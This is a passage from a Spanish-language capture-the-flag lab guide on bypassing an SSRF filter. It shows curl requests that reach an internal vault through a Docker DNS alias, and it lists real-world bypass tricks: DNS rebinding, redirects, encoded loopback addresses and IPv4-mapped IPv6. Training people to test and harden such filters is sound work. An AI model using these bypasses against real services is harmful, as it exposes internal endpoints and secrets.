## Bypass del filtro de SSRF

Este reto usa un segundo lab, `ssrf-deep` (puerto 18095). Levántalo igual que el
principal: `docker compose -f labs/ssrf-deep/compose.yaml --env-file labs/ssrf-deep/flags.env up -d`
(y bájalo con `down -v` al terminar).

El lab bloquea: `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`, `169.254`.

Pero el filtro solo comprueba el HOSTNAME de la URL. Y Docker crea aliases DNS
internos que resuelven al mismo contenedor:

```bash
# Directo (bloqueado):
curl "http://127.0.0.1:18095/fetch?url=http://localhost:8080/internal/vault"
# → 🚫 Blocked

# Con el alias (funciona):
curl "http://127.0.0.1:18095/fetch?url=http://ssrf-alias:8080/internal/vault"
# → ✅ Flag!
```

En producción real, los bypasses más comunes son:
- **DNS rebinding**: un dominio que resuelve primero a una IP pública, luego a interna
- **Redirects**: un servidor externo que hace 302 a localhost
- **IP encoding**: hexadecimal (0x7f000001), octal (0177.0.0.1), decimal (2130706433)
- **IPv6**: [::ffff:127.0.0.1] no siempre está en las listas de bloqueo
